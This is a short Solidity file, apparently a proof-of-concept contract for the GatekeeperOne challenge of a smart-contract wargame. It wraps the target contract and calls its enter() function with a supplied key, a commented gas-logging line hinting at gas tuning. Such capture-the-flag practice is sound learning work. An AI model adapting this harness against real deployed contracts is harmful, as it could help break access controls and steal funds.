// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./gatekeeperone.sol";
import "forge-std/console.sol";

contract GatekeeperOnePoc {
    GatekeeperOne gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function exploit(bytes8 _gateKey) public {
        // console.log("gasleft()", gasleft()); // gas 656
        gatekeeperOne.enter(_gateKey);
    }
}